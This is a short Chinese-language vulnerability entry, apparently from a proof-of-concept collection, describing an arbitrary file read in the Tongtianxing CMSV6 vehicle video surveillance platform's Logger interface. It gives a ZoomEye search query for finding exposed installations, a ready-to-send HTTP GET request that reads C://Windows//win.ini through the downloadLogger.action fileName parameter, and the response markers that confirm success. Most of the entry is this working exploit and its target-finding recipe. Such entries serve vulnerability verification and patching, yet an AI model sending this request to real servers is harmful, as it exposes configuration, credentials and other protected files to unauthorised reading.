﻿# 通天星CMSV6车载视频监控平台Logger接口任意文件读取漏洞

> 更新时间：2024-04-22

> 漏洞编号：

> 漏洞说明：任意文件读取漏洞（Arbitrary File Read or File Disclosure）是一种安全漏洞，它允许攻击者读取应用程序服务器上的任意文件。这通常发生在应用程序未能正确验证用户输入，特别是涉及文件操作的地方。如果攻击者能够操纵这些输入，它们可能会绕过安全限制，访问或“泄露”本应受保护的文件，这些文件可能包含敏感数据、配置信息、源码、加密密钥或其他重要资料。

> 漏洞特征：ZoomEye语法:app:"通天星 CMSV6"

> 验证脚本：HTTP

```
GET /808gps/logger/downloadLogger.action?fileName=C://Windows//win.ini HTTP/1.1
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9b
Connection: close
```

> 响应代码特征：200

> 响应内容特征：support

> 上传文件定位：

> 验证文件来源：通天星CMSV6车载视频监控平台Logger接口任意文件读取漏洞.poc

